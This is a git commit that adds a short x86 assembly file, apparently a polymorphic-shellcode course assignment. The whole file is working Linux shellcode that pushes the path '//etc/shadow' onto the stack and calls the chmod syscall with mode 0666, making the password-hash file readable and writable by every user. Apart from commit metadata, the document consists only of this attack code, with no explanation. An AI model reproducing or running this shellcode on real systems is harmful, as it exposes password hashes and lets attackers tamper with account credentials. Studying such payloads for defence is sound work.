d31c7da8149ca8dba069240a5a686f4c1eea9418
mut41b <38757067+mut41b@users.noreply.github.com>
2018-04-28 07:35:41 -0700

    Create Poly.asm

---
+++ Assignment_6/Poly.asm
@@ -0,0 +1,13 @@
+section .text 
+global _start
+
+_start:
+mov ax , 15 
+cdw ; DX:AX <------- sign extend of AX 
+push dx 
+push dword 0x776f6461
+push dword 0x68732f63 
+push dword 0x74652f2f
+mov ebx , esp 
+mov cx , 0666o
+int 0x80
